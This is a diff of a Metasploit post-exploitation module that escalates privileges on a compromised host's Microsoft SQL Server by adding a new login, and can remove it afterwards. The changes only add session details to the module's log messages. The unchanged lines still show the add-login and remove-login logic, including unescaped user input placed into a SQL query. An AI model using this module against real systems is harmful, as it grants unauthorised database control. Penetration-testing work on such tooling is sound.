@@ -47,7 +47,7 @@ class Metasploit3 < Msf::Post
     instance = datastore['INSTANCE'].to_s
 
     # Display target
-    print_status("Running module against #{sysinfo['Computer']}")
+    print_status("#{session_display_info}: Running module against #{sysinfo['Computer']}")
 
     # Identify available native SQL client
     get_sql_client
@@ -60,7 +60,7 @@ class Metasploit3 < Msf::Post
       service = check_for_sqlserver(instance)
       fail_with(Failure::Unknown, 'Unable to identify MSSQL Service') unless service
 
-      print_status("Identified service '#{service[:display]}', PID: #{service[:pid]}")
+      print_status("#{session_display_info}: Identified service '#{service[:display]}', PID: #{service[:pid]}")
       instance_name = service[:display].gsub('SQL Server (','').gsub(')','').lstrip.rstrip
 
       if datastore['REMOVE_LOGIN']
@@ -109,7 +109,7 @@ class Metasploit3 < Msf::Post
   end
 
   def add_sql_login(dbuser, dbpass, instance)
-    print_status("Attempting to add new login \"#{dbuser}\"...")
+    print_status("#{session_display_info}: Attempting to add new login \"#{dbuser}\"...")
     query = mssql_sa_escalation(username: dbuser, password: dbpass)
 
     # Get Data
@@ -117,33 +117,33 @@ class Metasploit3 < Msf::Post
 
     case add_login_result
     when '', /new login created/i
-      print_good("Successfully added login \"#{dbuser}\" with password \"#{dbpass}\"")
+      print_good("#{session_display_info}: Successfully added login \"#{dbuser}\" with password \"#{dbpass}\"")
       return true
     when /already exists/i
       fail_with(Failure::BadConfig, "Unable to add login #{dbuser}, user already exists")
     when /password validation failed/i
       fail_with(Failure::BadConfig, "Unable to add login #{dbuser}, password does not meet complexity requirements")
     else
-      print_error("Unable to add login #{dbuser}")
-      print_error("Database Error:\n #{add_login_result}")
+      print_error("#{session_display_info}: Unable to add login #{dbuser}")
+      print_error("#{session_display_info}: Database Error:\n #{add_login_result}")
       return false
     end
   end
 
   def remove_sql_login(dbuser, instance_name)
-    print_status("Attempting to remove login \"#{dbuser}\"")
+    print_status("#{session_display_info}: Attempting to remove login \"#{dbuser}\"")
     query = "sp_droplogin '#{dbuser}'"
 
     remove_login_result = run_sql(query, instance_name)
 
     # Display result
     if remove_login_result.empty?
-      print_good("Successfully removed login \"#{dbuser}\"")
+      print_good("#{session_display_info}: Successfully removed login \"#{dbuser}\"")
       return true
     else
       # Fail
-      print_error("Unabled to remove login #{dbuser}")
-      print_error("Database Error:\n\n #{remove_login_result}")
+      print_error("#{session_display_info}: Unabled to remove login #{dbuser}")
+      print_error("#{session_display_info}: Database Error:\n\n #{remove_login_result}")
       return false
     end
   end
